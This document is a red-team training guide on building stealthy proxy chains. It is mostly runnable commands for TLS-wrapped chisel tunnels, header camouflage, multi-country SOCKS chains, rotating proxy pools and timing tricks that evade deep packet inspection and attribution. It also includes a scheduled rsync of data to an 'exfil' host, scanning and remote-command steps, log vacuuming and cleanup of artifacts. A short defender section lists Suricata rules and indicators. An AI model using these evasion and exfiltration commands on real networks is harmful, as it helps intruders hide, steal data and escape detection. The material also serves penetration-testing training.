# Proxy Chain Evasion Guide

> Advanced techniques for building stealthy proxy chains that evade deep packet inspection, traffic analysis, and attribution. Covers SOCKS/HTTP proxy chaining with traffic obfuscation, timing attacks against detection systems, and operational security for proxy chain infrastructure.

## Introduction

Proxy chains are only as effective as their stealth. A well-constructed proxy chain that routes traffic through multiple countries and protocols can still be detected and attributed if the traffic patterns, timing, or protocol fingerprints reveal the underlying tunnel. This guide focuses on evasion techniques that make proxy chain traffic indistinguishable from legitimate network activity, defeating the detection systems that defenders deploy.

**Learning objectives**:

- Implement traffic obfuscation techniques that defeat deep packet inspection
- Configure timing-based evasion to avoid behavioral traffic analysis
- Build multi-path proxy infrastructure for attribution resistance
- Understand proxy chain detection from the defender's perspective
- Apply operational security best practices to proxy chain infrastructure

**Prerequisites**: Completed ssh-http-tunneling-pivoting.md and socks-proxy-chain-traffic.md guides. Working proxy chain infrastructure. Understanding of TLS, HTTP, and SOCKS protocols at the packet level.

---

## 1. Deep Packet Inspection Evasion

Deep packet inspection (DPI) systems examine packet payloads beyond IP and port headers to identify protocols and applications. DPI can detect SOCKS handshakes, chisel HTTP patterns, and other tunnel signatures even when they run on standard ports.

### Protocol Mimicry with stunnel

The most effective DPI evasion technique is wrapping tunnel traffic in TLS with a valid certificate. DPI systems that perform TLS interception can still see the plaintext, so additional obfuscation may be needed in high-security environments.

```bash
# Step 1: Obtain a valid TLS certificate (Let's Encrypt)
certbot certonly --standalone -d tunnel.example.com

# Step 2: Configure stunnel with strong TLS settings
cat > /etc/stunnel/stealth.conf << 'EOF'
cert = /etc/letsencrypt/live/tunnel.example.com/fullchain.pem
key = /etc/letsencrypt/live/tunnel.example.com/privkey.pem
options = NO_SSLv2
options = NO_SSLv3
minProtocol = TLSv1.2
ciphers = ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256

[tunnel-service]
accept = 0.0.0.0:443
connect = 127.0.0.1:8080
EOF

stunnel /etc/stunnel/stealth.conf

# Step 3: Client connects through stunnel
cat > /etc/stunnel/stealth-client.conf << 'EOF'
client = yes

[tunnel-service]
accept = 127.0.0.1:9090
connect = tunnel.example.com:443
EOF

stunnel /etc/stunnel/stealth-client.conf

# Step 4: Route chisel through the TLS tunnel
chisel client http://127.0.0.1:9090 R:socks

# DPI analysis: traffic appears as standard HTTPS to tunnel.example.com
# No SOCKS handshake, no chisel HTTP headers visible to DPI
```

### HTTP Header Camouflage

When TLS wrapping is not possible, camouflaging HTTP tunnel traffic with legitimate headers can bypass basic HTTP inspection.

```bash
# Chisel with full HTTP header camouflage
chisel client http://server:8080 R:socks \
  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
  --header "Accept-Language: en-US,en;q=0.5" \
  --header "Accept-Encoding: gzip, deflate, br" \
  --header "DNT: 1" \
  --header "Connection: keep-alive" \
  --header "Upgrade-Insecure-Requests: 1"

# gost with HTTP/2 support for better camouflage
gost -L "http2://:443" -F "socks5://internal:1080"
# HTTP/2 binary framing makes traffic analysis more difficult
```

### Protocol Padding

Adding random padding to tunnel packets makes traffic analysis based on packet size patterns more difficult.

```bash
# Using socat with random padding (add random bytes to each packet)
socat TCP-LISTEN:8080,fork,reuseaddr \
  EXEC:"cat /dev/urandom | head -c \$((RANDOM\%256+64)) && cat"

# gost with built-in padding options
gost -L "tls://:443?padding=true" -F socks5://proxy:1080
```

---

## 2. Timing-Based Evasion

Traffic analysis systems detect tunnels through timing patterns: consistent inter-packet intervals, burst patterns, and connection durations. Timing-based evasion introduces randomness that breaks these patterns.

### Traffic Shaping

```bash
# Per-application bandwidth limiting with trickle
trickle -d 500 -u 100 proxychains4 curl http://target/page
# Limits download to 500 KB/s and upload to 100 KB/s
# Matches typical browsing bandwidth patterns

# System-level traffic shaping with tc
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms

# Remove traffic shaping when done
sudo tc qdisc del dev eth0 root

# Scheduled transfers during business hours only
echo "proxychains4 rsync -av data/ user@exfil:/backup/" | at 14:00
echo "proxychains4 nmap -sT -Pn target --top-ports 100" | at 10:30
```

### Interactive Session Timing

```bash
# Add random delays between scanning probes to mimic manual testing
cat > slow_scan.sh << 'SCRIPT'
#!/bin/bash
TARGET=$1
for port in $(nmap -sT -Pn --top-ports 100 -p- $TARGET 2>/dev/null | grep open | awk '{print $1}'); do
  echo "Found: $port"
  sleep $((RANDOM % 30 + 10))  # Random 10-40 second delay between findings
done
SCRIPT
chmod +x slow_scan.sh

# Randomize nmap scan timing
nmap -sT -Pn --scan-delay $(shuf -i 200-2000 -n 1)ms --max-retries 2 target

# Mimic interactive SSH session timing
# Add keystroke-like delays to command execution
proxychains4 ssh target "for cmd in 'ls' 'whoami' 'id' 'hostname'; do eval \$cmd; sleep \$((RANDOM % 5 + 1)); done"
```

### Connection Pattern Obfuscation

```bash
# Distribute connections across multiple time windows
cat > distributed_scan.sh << 'SCRIPT'
#!/bin/bash
TARGETS=$1
TOTAL=$(wc -l < $TARGETS)
CHUNK_SIZE=5
DELAY=300  # 5 minutes between chunks

for i in $(seq 1 $CHUNK_SIZE $TOTAL); do
  chunk=$(sed -n "${i},$((i+CHUNK_SIZE-1))p" $TARGETS)
  proxychains4 nmap -sT -Pn --top-ports 20 $chunk
  [ $((i+CHUNK_SIZE)) -lt $TOTAL ] && sleep $DELAY
done
SCRIPT
```

---

## 3. Multi-Path Proxy Infrastructure

### Geographic Distribution

Distributing proxy endpoints across multiple geographic regions and hosting providers makes attribution significantly more difficult.

```bash
# Proxy chain through multiple countries
# Operator -> [US VPS] -> [EU VPS] -> [Asia VPS] -> Target network

# Layer 1: SOCKS proxy on US VPS
ssh -D 1080 -fN user@us-vps.example.com

# Layer 2: SOCKS proxy on EU VPS (through US VPS)
proxychains4 ssh -D 1081 -fN user@eu-vps.example.com

# Layer 3: SOCKS proxy on Asia VPS (through US and EU VPS)
cat > /etc/proxychains-us-eu.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF
proxychains4 -f /etc/proxychains-us-eu.conf ssh -D 1082 -fN user@asia-vps.example.com

# Final chain: US -> EU -> Asia -> Target
cat > /etc/proxychains-full.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
EOF

proxychains4 -f /etc/proxychains-full.conf nmap -sT -Pn target
```

### Infrastructure Rotation

```bash
# Rotate proxy endpoints to prevent long-term pattern analysis
# Maintain a pool of VPS instances and rotate connections

# Proxy pool configuration
cat > /etc/proxychains-rotating.conf << 'EOF'
random_chain
chain_len = 2
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
# US region
socks5 us-east.proxy.example.com 1080
socks5 us-west.proxy.example.com 1080
# EU region
socks5 eu-west.proxy.example.com 1080
socks5 eu-central.proxy.example.com 1080
# Asia region
socks5 ap-south.proxy.example.com 1080
socks5 ap-east.proxy.example.com 1080
EOF

# Each connection randomly selects 2 proxies from the pool
# Distributing traffic across 6 endpoints in 3 regions
proxychains4 -f /etc/proxychains-rotating.conf curl http://target/api
```

---

## 4. Operational Security for Proxy Infrastructure

### Server Hardening

```bash
# Harden proxy VPS instances
# Disable unnecessary services
sudo systemctl disable apache2 nginx  # No web server needed
sudo systemctl disable cups avahi-daemon bluetooth

# Configure firewall (allow only SSH and proxy ports)
sudo ufw default deny incoming
sudo ufw allow 22/tcp       # SSH
sudo ufw allow 443/tcp      # HTTPS (for TLS-wrapped tunnels)
sudo ufw allow 1080/tcp     # SOCKS proxy
sudo ufw enable

# SSH hardening
cat >> /etc/ssh/sshd_config << 'EOF'
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
X11Forwarding no
AllowTcpForwarding yes
GatewayPorts no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
EOF
sudo systemctl restart sshd

# Disable logging of proxy traffic (engagement-specific consideration)
# Log only authentication events, not proxy traffic content
sudo journalctl --vacuum-time=1d
```

### Cleanup Procedures

```bash
# Clean up proxy chain infrastructure after engagement

# Kill all tunnel processes
pkill -f "chisel\|stunnel\|socat\|ssh.*-D"

# Remove TUN/TAP interfaces
for iface in $(ip link show | grep -oP 'tun\d+|tap\d+'); do
  sudo ip link set dev $iface down 2>/dev/null
  sudo ip tuntap del dev $iface mode tun 2>/dev/null
done

# Remove routing table entries
ip route show | grep -E "tun|tap|proxy" | while read route; do
  sudo ip route del $route 2>/dev/null
done

# Remove proxy configuration files
rm -f /etc/proxychains*.conf
rm -f /etc/stunnel/*.conf
rm -f /tmp/chisel /tmp/ligolo*

# Verify cleanup
ps aux | grep -E "chisel|stunnel|socat|ligolo|ssh.*-D" | grep -v grep
ip link show | grep -E "tun|tap"
ip route show | grep -v "default\|link\|eth0\|lo"
```

---

## 5. Detection from the Defender's Perspective

Understanding how defenders detect proxy chains helps build more stealthy infrastructure and provides accurate detection guidance in penetration test reports.

### Network Flow Analysis Indicators

```bash
# Detect proxy chain indicators in network flow data
# Look for sequential connections through multiple internal hosts

# Suricata rule: detect SOCKS5 handshake
# alert tcp any any -> any any (msg:"SOCKS5 handshake detected"; \
#   content:"|05|"; depth:1; offset:0; sid:2000001;)

# Suricata rule: detect chisel HTTP patterns
# alert http any any -> any any (msg:"Chisel tunnel detected"; \
#   http.header; content:"chisel"; nocase; sid:2000002;)

# Behavioral analysis: identify hosts acting as proxy relays
# A proxy relay host shows:
# - Inbound connections from few sources (operator)
# - Outbound connections to many destinations (targets)
# - High ratio of outbound connections to inbound
# - Connection duration significantly longer than typical client sessions
```

### Endpoint Detection Indicators

```bash
# Monitor for tunnel-related process creation
# Sysmon Event ID 1 (Process Creation)
# Look for: chisel.exe, plink.exe, socat, stunnel, ligolo-ng

# Monitor for TUN/TAP interface creation
ip link show | grep -E "tun|tap"
# On Windows: netsh interface show interface

# Monitor for unusual network listeners
ss -tlnp | grep -E "1080|8080|9090|4443"
# SOCKS proxies typically listen on 1080, 1081, etc.
# HTTP tunnels on 8080, 9090, etc.
```

---

## Hands-on Exercise: Stealth Proxy Chain Construction

Build a fully obfuscated proxy chain that evades DPI and traffic analysis.

**Setup**: Three VPS instances in different countries with root access. Valid TLS certificates for each endpoint. Domain name for DNS-based infrastructure.

**Exercise steps**:

1. Deploy SOCKS proxies on each VPS with authentication
2. Wrap each proxy connection in TLS using stunnel with valid certificates
3. Configure proxychains for a strict chain through all three VPS instances
4. Implement traffic shaping with timing delays matching business-hour patterns
5. Test the chain against DPI detection tools (Suricata/snort with tunnel detection rules)
6. Measure the detection rate with and without evasion techniques
7. Document the complete proxy chain configuration and evasion techniques used

**Validation criteria**: Route traffic through a 3-hop TLS-wrapped proxy chain. Demonstrate that tunnel traffic passes DPI inspection without triggering detection rules. Show timing analysis results that match legitimate traffic patterns.

## References

- **ssh-http-tunneling-pivoting.md** -- For building the underlying tunnel infrastructure
- **dns-icmp-covert-tunnel.md** -- For additional covert tunnel options
- **socks-proxy-chain-traffic.md** -- For basic proxy chaining configuration
- [proxychains-ng GitHub](https://github.com/rofl0r/proxychains-ng)
- [stunnel Documentation](https://www.stunnel.org/)
- [MITRE ATT&CK T1090 - Proxy](https://attack.mitre.org/techniques/T1090/)
- [MITRE ATT&CK T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)
- [SANS - Detecting Covert Channels](https://www.sans.org/white-papers/)
